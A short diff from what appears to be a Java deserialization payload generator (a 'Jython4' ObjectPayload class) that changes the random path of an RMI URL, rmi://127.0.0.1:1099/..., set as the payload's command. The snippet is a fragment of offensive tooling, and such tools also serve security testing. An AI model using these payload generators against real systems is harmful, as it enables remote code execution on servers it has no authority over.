@@ -30,7 +30,7 @@ public class Jython4 implements ObjectPayload<Object> {
         SinksHelper sinksHelper = new SinksHelper();
         sinksHelper.setSink(Jython4.class.getAnnotation(Sink.class).value()[0]);
         sinksHelper.setEnchant(EnchantType.DEFAULT);
-        sinksHelper.setCommand("rmi://127.0.0.1:1099/4zrmle");
+        sinksHelper.setCommand("rmi://127.0.0.1:1099/wtkwre");
         JavaClassHelper javaClassHelper = new JavaClassHelper();
         javaClassHelper.setExtendsAbstractTranslet(true);
         sinksHelper.setJavaClassHelper(javaClassHelper);
